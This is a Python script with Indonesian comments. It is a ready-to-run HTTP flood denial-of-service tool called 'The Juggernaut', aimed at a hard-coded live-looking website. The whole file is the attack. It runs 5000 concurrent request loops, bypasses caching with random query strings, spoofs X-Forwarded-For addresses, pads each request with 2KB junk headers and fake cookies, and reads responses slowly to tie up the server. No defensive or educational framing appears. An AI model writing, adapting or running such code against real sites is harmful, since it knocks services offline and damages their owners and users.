import asyncio
import aiohttp
import random
import string
import time

# --- KONFIGURASI TARGET ---
TARGET = "https://ingatcuan88.pro/"
CONCURRENCY_LIMIT = 5000 # Jumlah koneksi serentak

def random_data(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def juggernaut_payload(session):
    while True:
        try:
            # Teknik: Query String Randomization (Bypass Cache)
            url = f"{TARGET}?s={random_data(15)}&ref={random_data(10)}"
            
            # Teknik: Header Bloating (Membuat server lelah membaca request)
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random_data(5)}",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Cookie": f"session_id={random_data(50)}; tracking={random_data(20)}",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Large-Trash-Header": "X" * 2048 # Menambah beban memori server
            }

            async with session.get(url, headers=headers, timeout=10) as response:
                # Memaksa server memproses data (Slow-Read simulation)
                await response.content.read(1)
                print(f"[*] Juggernaut Hit! | Status: {response.status}")
        except:
            await asyncio.sleep(0.01)

async def main():
    print(f"🔥 MENGAKTIFKAN THE JUGGERNAUT PADA {TARGET} 🔥")
    print("--- PC ANDA AKAN BEKERJA KERAS SEKARANG ---")
    
    # TCPConnector tanpa limit untuk performa maksimal
    connector = aiohttp.TCPConnector(limit=0, ssl=False, use_dns_cache=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [juggernaut_payload(session) for _ in range(CONCURRENCY_LIMIT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Operasi Dihentikan.")
